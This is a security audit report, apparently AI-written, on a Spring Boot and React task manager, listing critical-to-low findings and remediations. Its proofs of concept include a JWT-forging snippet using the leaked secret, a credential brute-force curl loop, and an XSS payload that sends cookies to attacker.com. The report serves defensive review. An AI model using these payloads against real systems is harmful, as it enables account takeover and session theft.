# Security Audit Report - Task Manager Application

**Date:** November 19, 2025
**Auditor:** Claude (Security Penetration Testing)
**Application:** Task Manager - Full-Stack Web Application
**Repository:** https://github.com/0zturkSamet/task-manager

---

## Executive Summary

This security audit was conducted on a full-stack task management application built with Spring Boot (backend) and React (frontend). The application implements JWT-based authentication, role-based access control, and various project/task management features.

**Overall Security Rating: MODERATE** ⚠️

The application demonstrates good security practices in several areas, including:
- Parameterized queries preventing SQL injection
- JWT-based authentication with BCrypt password hashing
- Authorization checks at service layer
- Soft delete implementation
- Input validation

However, several **CRITICAL** and **HIGH** severity vulnerabilities were identified that require immediate attention.

---

## Table of Contents

1. [Critical Vulnerabilities](#critical-vulnerabilities)
2. [High Severity Issues](#high-severity-issues)
3. [Medium Severity Issues](#medium-severity-issues)
4. [Low Severity Issues](#low-severity-issues)
5. [Good Security Practices Observed](#good-security-practices-observed)
6. [Detailed Findings](#detailed-findings)
7. [Remediation Recommendations](#remediation-recommendations)
8. [Testing Methodology](#testing-methodology)

---

## Critical Vulnerabilities

### 🔴 CRITICAL-01: JWT Secret Key Hardcoded in Configuration

**File:** `backend/src/main/resources/application.yml:43`

**Issue:**
```yaml
jwt:
  secret: ${JWT_SECRET:404E635266556A586E3272357538782F413F4428472B4B6250645367566B5970}
```

The JWT secret has a default fallback value hardcoded in the configuration file. If the `JWT_SECRET` environment variable is not set, this default value will be used, which is:
- Publicly visible in the repository
- Can be used by attackers to forge valid JWT tokens
- Grants unauthorized access to any user account

**Impact:** An attacker can generate valid JWT tokens for any user, completely bypassing authentication.

**CVSS Score:** 9.8 (Critical)

**Proof of Concept:**
```bash
# Attacker can use the hardcoded secret to forge tokens
import jwt
secret = "404E635266556A586E3272357538782F413F4428472B4B6250645367566B5970"
payload = {"sub": "admin@example.com", "exp": 9999999999}
token = jwt.encode(payload, secret, algorithm="HS256")
# Use this token to authenticate as any user
```

**Recommendation:**
1. Remove the default fallback value entirely
2. Fail application startup if JWT_SECRET is not provided
3. Rotate the JWT secret immediately in all environments
4. Use environment-specific secrets (never commit to git)

---

### 🔴 CRITICAL-02: No Rate Limiting on Authentication Endpoints

**Files:** `backend/src/main/java/com/taskmanager/controller/AuthController.java`

**Issue:**
The login and registration endpoints have no rate limiting implemented. This allows:
- Brute force attacks on user credentials
- Account enumeration via timing attacks
- DoS attacks by flooding the authentication system

**Impact:**
- Unauthorized access through credential stuffing
- User account compromise
- Service degradation/denial

**CVSS Score:** 8.2 (High)

**Proof of Concept:**
```bash
# Brute force attack example
for password in password_list.txt; do
  curl -X POST http://api.example.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"$password\"}"
done
# No rate limiting prevents unlimited attempts
```

**Recommendation:**
1. Implement rate limiting (e.g., max 5 attempts per 15 minutes per IP)
2. Add account lockout after failed attempts
3. Implement CAPTCHA after 3 failed attempts
4. Use Spring Security's built-in features or libraries like Bucket4j

---

### 🔴 CRITICAL-03: Insecure Direct Object Reference (IDOR) in User Search

**File:** `backend/src/main/java/com/taskmanager/controller/UserController.java:54-59`

**Issue:**
```java
@GetMapping("/all")
public ResponseEntity<List<UserResponse>> getAllUsers() {
    List<UserResponse> users = userService.getAllUsers();
    return ResponseEntity.ok(users);
}
```

The `/api/users/all` endpoint returns ALL users in the system without any authentication check or pagination. This exposes:
- All user emails
- User names
- User IDs
- Account status

**Impact:**
- Privacy violation (GDPR concern)
- Information disclosure for targeted attacks
- User enumeration

**CVSS Score:** 7.5 (High)

**Recommendation:**
1. Add `@AuthenticationPrincipal` to verify user is authenticated
2. Implement pagination to prevent data scraping
3. Limit results based on user's project memberships
4. Consider removing this endpoint entirely if not necessary

---

## High Severity Issues

### 🟠 HIGH-01: XSS Vulnerability via Unsanitized User Input

**Files:** Multiple frontend and backend components

**Issue:**
User-generated content (task descriptions, comments, project names) is not sanitized before storage or display. While React provides some XSS protection by default, there are potential attack vectors:

1. **Task/Project Descriptions:** Stored in database without sanitization
2. **Comment Text:** No HTML encoding on backend
3. **User Names:** Can contain special characters

**Example Attack Vector:**
```javascript
// Attacker creates task with malicious title
POST /api/tasks
{
  "title": "<img src=x onerror='fetch(\"http://attacker.com?cookie=\"+document.cookie)'>",
  "description": "<script>/* malicious code */</script>"
}
```

**Impact:**
- Session hijacking via stolen tokens
- Phishing attacks
- Malicious redirects

**CVSS Score:** 7.1 (High)

**Recommendation:**
1. Implement server-side HTML sanitization (OWASP Java HTML Sanitizer)
2. Use Content Security Policy (CSP) headers
3. Implement DOMPurify on frontend for defense in depth
4. Validate and sanitize all user inputs

---

### 🟠 HIGH-02: JWT Token Stored in localStorage (XSS Risk)

**File:** `frontend/src/services/authService.js:32`

**Issue:**
```javascript
setAuthData(token, userData) {
    localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, token);
    localStorage.setItem(STORAGE_KEYS.USER_DATA, JSON.stringify(userData));
}
```

JWT tokens are stored in localStorage, which is accessible to any JavaScript code on the page. If an XSS vulnerability exists, an attacker can:
- Steal the JWT token
- Impersonate the user
- Maintain persistent access

**Impact:**
- Complete account compromise if XSS is achieved
- Session hijacking
- Unauthorized data access

**CVSS Score:** 7.4 (High)

**Recommendation:**
1. Store JWT in httpOnly cookies instead of localStorage
2. Implement SameSite cookie attribute
3. Add CSRF protection for cookie-based authentication
4. Consider using refresh token pattern

---

### 🟠 HIGH-03: Sensitive Data Logged in DEBUG Mode

**File:** `backend/src/main/resources/application.yml:64-68`

**Issue:**
```yaml
logging:
  level:
    root: INFO
    com.taskmanager: DEBUG
    org.springframework.security: DEBUG
    org.hibernate.SQL: DEBUG
```

Debug logging is enabled by default, which may log:
- SQL queries with sensitive data
- User credentials (in error scenarios)
- JWT tokens
- Authentication details

**Impact:**
- Sensitive information disclosure via logs
- Compliance violations (PCI-DSS, GDPR)
- Attack surface expansion if logs are compromised

**CVSS Score:** 6.5 (Medium-High)

**Recommendation:**
1. Set default logging to WARN or INFO
2. Only enable DEBUG in development environment
3. Implement log sanitization for sensitive fields
4. Use Spring profiles properly (dev vs prod)

---

### 🟠 HIGH-04: Missing Security Headers

**Issue:**
The application does not implement critical security headers:
- No Content Security Policy (CSP)
- No X-Frame-Options (clickjacking protection)
- No X-Content-Type-Options
- No Strict-Transport-Security (HSTS)
- No Referrer-Policy

**Impact:**
- Clickjacking attacks
- MIME-type confusion attacks
- Man-in-the-middle attacks (no HSTS)
- Cross-site scripting (no CSP)

**CVSS Score:** 6.8 (Medium-High)

**Recommendation:**
Add security headers configuration:
```java
@Bean
public FilterRegistrationBean<HeaderFilter> securityHeadersFilter() {
    FilterRegistrationBean<HeaderFilter> registrationBean = new FilterRegistrationBean<>();
    // Add: CSP, X-Frame-Options, X-Content-Type-Options, HSTS, etc.
}
```

---

## Medium Severity Issues

### 🟡 MEDIUM-01: Dependency Vulnerabilities

**NPM Audit Findings:**

1. **glob** (10.2.0 - 10.4.5) - **HIGH**
   - CVE: Command injection via -c/--cmd executes matches with shell:true
   - Advisory: GHSA-5j98-mcp5-4vw2

2. **js-yaml** (4.0.0 - 4.1.0) - **MODERATE**
   - CVE: Prototype pollution in merge (<<)
   - Advisory: GHSA-mh29-5h37-fv8m

3. **vite** (7.1.0 - 7.1.10) - **MODERATE**
   - CVE: server.fs.deny bypass via backslash on Windows
   - Advisory: GHSA-93m4-6634-74q7

**Recommendation:**
```bash
cd frontend
npm audit fix
npm update glob js-yaml vite
```

---

### 🟡 MEDIUM-02: No Account Lockout Mechanism

**Issue:**
The application has no mechanism to lock accounts after repeated failed login attempts.

**Impact:**
- Facilitates brute force attacks
- No protection against credential stuffing
- Unlimited password guessing attempts

**Recommendation:**
Implement account lockout:
- Lock account after 5 failed attempts
- Temporary lockout (15-30 minutes)
- Email notification to user
- Admin unlock capability

---

### 🟡 MEDIUM-03: Weak CORS Configuration

**File:** `backend/src/main/java/com/taskmanager/config/SecurityConfig.java:67-73`

**Issue:**
```java
configuration.setAllowedOriginPatterns(Arrays.asList(
    "http://localhost:3000",
    "http://localhost:5173",
    "http://localhost:5174",
    "https://*.vercel.app",      // Too permissive
    "https://*.netlify.app"      // Too permissive
));
configuration.setAllowedHeaders(Arrays.asList("*")); // Too permissive
```

Wildcard patterns allow any subdomain on Vercel/Netlify, potentially including attacker-controlled domains.

**Recommendation:**
1. Use specific allowed origins (no wildcards)
2. Whitelist specific headers instead of "*"
3. Review and minimize allowed methods

---

### 🟡 MEDIUM-04: Missing Input Length Validation

**Issue:**
No maximum length validation on text fields could lead to:
- DoS via extremely large inputs
- Database storage issues
- Buffer overflow in certain scenarios

**Affected Fields:**
- Task descriptions
- Comment text
- Project descriptions

**Recommendation:**
Add Jakarta validation annotations:
```java
@Size(max = 5000, message = "Description cannot exceed 5000 characters")
private String description;
```

---

### 🟡 MEDIUM-05: No Password Complexity Requirements

**File:** `backend/src/main/java/com/taskmanager/service/AuthService.java`

**Issue:**
Password registration accepts any password without complexity requirements:
- No minimum length enforcement
- No requirement for special characters
- No requirement for mixed case
- No requirement for numbers

**Recommendation:**
Implement password policy:
```java
@Pattern(
    regexp = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{12,}$",
    message = "Password must be at least 12 characters with uppercase, lowercase, number, and special character"
)
private String password;
```

---

### 🟡 MEDIUM-06: Swagger/API Documentation Exposed in Production

**File:** `backend/src/main/java/com/taskmanager/config/SecurityConfig.java:46-49`

**Issue:**
```java
.requestMatchers(
    "/api-docs/**",
    "/swagger-ui/**",
    "/swagger-ui.html",
```

Swagger UI is publicly accessible without authentication, exposing:
- All API endpoints
- Request/response schemas
- Parameter details
- Authentication mechanisms

**Recommendation:**
1. Disable Swagger in production
2. Add authentication for Swagger in non-prod environments
3. Use Spring profiles to control availability

---

### 🟡 MEDIUM-07: No JWT Token Revocation Mechanism

**Issue:**
The application uses stateless JWT tokens with no ability to revoke them before expiration. This means:
- Logout doesn't truly invalidate tokens
- Compromised tokens remain valid for 24 hours
- No way to force user re-authentication

**Recommendation:**
Implement token blacklist or use refresh token pattern:
1. Store revoked tokens in Redis with TTL
2. Check blacklist on each request
3. Implement short-lived access tokens (5-15 min) with refresh tokens

---

## Low Severity Issues

### 🟢 LOW-01: Verbose Error Messages in Exception Handler

**File:** `backend/src/main/java/com/taskmanager/exception/GlobalExceptionHandler.java:127-139`

**Issue:**
While the generic exception handler doesn't expose stack traces (good), error messages could leak information:
```java
.message("An unexpected error occurred. Please try again later.")
```

However, the path is included in error responses, which could reveal internal URL structure.

**Recommendation:**
- Remove or hash the path in production
- Implement error tracking ID system
- Log full details server-side only

---

### 🟢 LOW-02: Missing Request ID for Tracing

**Issue:**
No correlation ID or request tracing mechanism makes it difficult to:
- Track requests across logs
- Debug security incidents
- Correlate attack patterns

**Recommendation:**
Add correlation ID filter/interceptor for request tracking.

---

### 🟢 LOW-03: No Password Expiration Policy

**Issue:**
Passwords never expire, which could lead to:
- Long-term use of compromised credentials
- Reduced security over time

**Recommendation:**
- Implement optional password expiration (90-180 days)
- Send email reminders
- Force password change on first login

---

### 🟢 LOW-04: Session Timeout Not Configurable

**Issue:**
JWT expiration is fixed at 24 hours with no option for shorter sessions for sensitive operations.

**Recommendation:**
- Make JWT expiration configurable per user role
- Implement "Remember Me" vs "Secure Session" options
- Consider shorter sessions for admin users

---

## Good Security Practices Observed

✅ **SQL Injection Prevention:**
- Spring Data JPA with parameterized queries
- No raw SQL string concatenation
- Use of @Query with named parameters

✅ **Password Security:**
- BCrypt hashing with strength 12
- Passwords never returned in API responses
- User entity implements UserDetails properly

✅ **Authorization Checks:**
- Comprehensive permission checks at service layer
- Role-based access control (OWNER, ADMIN, VIEWER)
- Project membership validation before data access

✅ **Soft Deletes:**
- Using `is_active` flag instead of hard deletes
- Preserves data integrity and audit trail

✅ **Input Validation:**
- Jakarta Validation annotations used
- MethodArgumentNotValidException properly handled
- Request DTOs separate from entities

✅ **CSRF Protection:**
- Appropriately disabled for stateless JWT API
- Sessions properly configured as STATELESS

✅ **Database Migrations:**
- Flyway for version-controlled schema changes
- Baseline-on-migrate enabled

✅ **Environment Variables:**
- Sensitive configs externalized
- No .env files committed to repository

---

## Detailed Findings

### Authentication Flow Analysis

**Current Implementation:**
1. User submits credentials to `/api/auth/login`
2. Backend validates credentials with BCrypt
3. JWT token generated with 24-hour expiration
4. Token sent to client and stored in localStorage
5. Subsequent requests include token in Authorization header
6. JwtAuthenticationFilter validates token on each request

**Security Gaps:**
- No brute force protection
- No MFA/2FA option
- Token in localStorage vulnerable to XSS
- No token refresh mechanism
- No session management

---

### Authorization Implementation Review

**Strengths:**
```java
// Proper authorization checks in TaskService
if (!hasAccessToProject(userId, projectId)) {
    throw new ForbiddenException("You don't have access to this project");
}

// Role-based checks
if (!canCreateTasks(userId, projectId)) {
    throw new ForbiddenException("You don't have permission to create tasks");
}
```

**Weaknesses:**
- Admin bypass logic could be abused if admin flag is compromised
- No audit logging of authorization decisions
- Permission checks not consistently applied across all endpoints

---

### Data Exposure Analysis

**Exposed Information:**

1. **User Enumeration:**
   - `/api/users/all` - Lists all users
   - `/api/users/search?q=` - Search without pagination
   - Error messages reveal if email exists

2. **Project Information:**
   - Project member lists exposed to all members
   - Project statistics available to VIEWER role

3. **Task Details:**
   - Comments visible to all project members
   - Task assignee information always visible

**Recommendation:**
Implement principle of least privilege - only expose necessary data to authorized users.

---

## Remediation Recommendations

### Priority 1 (Immediate - Within 24 hours)

1. **Remove hardcoded JWT secret**
   - Update application.yml to fail if JWT_SECRET not provided
   - Rotate all JWT secrets in production
   - Update deployment documentation

2. **Implement rate limiting**
   - Add Spring Security rate limiting or Bucket4j
   - Configure limits: 5 login attempts per 15 minutes per IP
   - Add CAPTCHA after 3 failed attempts

3. **Fix IDOR in /api/users/all**
   - Add authentication requirement
   - Implement pagination
   - Scope results to user's projects

### Priority 2 (Within 1 week)

4. **Add security headers**
   - CSP, X-Frame-Options, HSTS, X-Content-Type-Options
   - Configure in SecurityFilterChain

5. **Update vulnerable dependencies**
   ```bash
   npm audit fix
   npm update glob js-yaml vite
   ```

6. **Implement input sanitization**
   - Add OWASP Java HTML Sanitizer
   - Sanitize all user-generated content
   - Add CSP header

7. **Move JWT to httpOnly cookies**
   - Refactor authentication to use cookies
   - Add CSRF protection
   - Update frontend to handle cookie-based auth

### Priority 3 (Within 1 month)

8. **Implement account lockout**
   - Lock after 5 failed attempts
   - 15-minute lockout period
   - Email notification

9. **Add password complexity requirements**
   - Minimum 12 characters
   - Mixed case, numbers, special characters
   - Password history (prevent reuse)

10. **Implement JWT token revocation**
    - Use Redis for token blacklist
    - Add logout endpoint that blacklists tokens
    - Implement refresh token pattern

11. **Disable Swagger in production**
    - Use Spring profiles
    - Require authentication for Swagger in dev

12. **Fix logging configuration**
    - Set prod logging to WARN/INFO
    - Remove DEBUG from default profile
    - Implement log sanitization

---

## Testing Methodology

### Tools Used:
- Manual code review
- Static analysis of source code
- Dependency vulnerability scanning (npm audit)
- OWASP Top 10 checklist verification
- Authentication/Authorization flow analysis

### Areas Tested:
1. ✅ SQL Injection (parameterized queries verified)
2. ✅ XSS vulnerabilities (multiple vectors identified)
3. ✅ Authentication bypass (JWT secret issue found)
4. ✅ Authorization flaws (IDOR vulnerabilities found)
5. ✅ Sensitive data exposure (several issues found)
6. ✅ Security misconfigurations (multiple found)
7. ✅ Dependency vulnerabilities (3 found via npm audit)
8. ✅ CSRF protection (properly disabled for JWT API)
9. ✅ Rate limiting (not implemented - critical)
10. ✅ Logging and monitoring (verbose logging found)

### Testing Limitations:
- No dynamic testing performed (only static analysis)
- No penetration testing of deployed environments
- Database security not audited
- Infrastructure/network security not assessed
- Social engineering vectors not tested

---

## Compliance Considerations

### GDPR Compliance Issues:
1. **Data minimization:** `/api/users/all` exposes all user data
2. **Audit logging:** No comprehensive audit trail
3. **Data retention:** No policy for soft-deleted data
4. **Right to erasure:** Soft delete doesn't truly remove data

### OWASP Top 10 2021 Mapping:

| OWASP Category | Status | Findings |
|----------------|--------|----------|
| A01:2021 - Broken Access Control | ❌ FAIL | IDOR, missing auth checks |
| A02:2021 - Cryptographic Failures | ⚠️ PARTIAL | Hardcoded JWT secret |
| A03:2021 - Injection | ✅ PASS | Parameterized queries used |
| A04:2021 - Insecure Design | ⚠️ PARTIAL | No rate limiting, no MFA |
| A05:2021 - Security Misconfiguration | ❌ FAIL | Debug logging, exposed Swagger, no headers |
| A06:2021 - Vulnerable Components | ❌ FAIL | 3 vulnerable npm packages |
| A07:2021 - ID and Auth Failures | ❌ FAIL | Weak password policy, no lockout, JWT issues |
| A08:2021 - Software/Data Integrity | ⚠️ PARTIAL | No token revocation |
| A09:2021 - Security Logging Failures | ⚠️ PARTIAL | No audit logs, verbose logging |
| A10:2021 - SSRF | ✅ N/A | No external requests from user input |

---

## Conclusion

The Task Manager application demonstrates several good security practices, particularly in preventing SQL injection and implementing basic authorization checks. However, **critical vulnerabilities** exist that could lead to complete system compromise:

1. Hardcoded JWT secret allows authentication bypass
2. No rate limiting enables brute force attacks
3. IDOR vulnerabilities expose user data
4. XSS risks due to lack of input sanitization
5. Missing security headers
6. Vulnerable dependencies

**Risk Assessment:**
- **Current State:** HIGH RISK ⚠️
- **With Priority 1 Fixes:** MEDIUM RISK
- **With All Fixes:** LOW-MEDIUM RISK

**Recommendation:** Do NOT deploy to production until Priority 1 issues are resolved. Priority 2 and 3 issues should be addressed before handling sensitive data or achieving production scale.

---

## Appendix

### Useful Security Resources:
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Spring Security: https://spring.io/projects/spring-security
- JWT Best Practices: https://tools.ietf.org/html/rfc8725
- OWASP Java HTML Sanitizer: https://github.com/OWASP/java-html-sanitizer

### Contact:
For questions about this security audit, please refer to the detailed findings above and implement the remediation steps in priority order.

---

**Report Version:** 1.0
**Generated:** November 19, 2025
**Next Review:** Recommended after all Priority 1 & 2 fixes are implemented
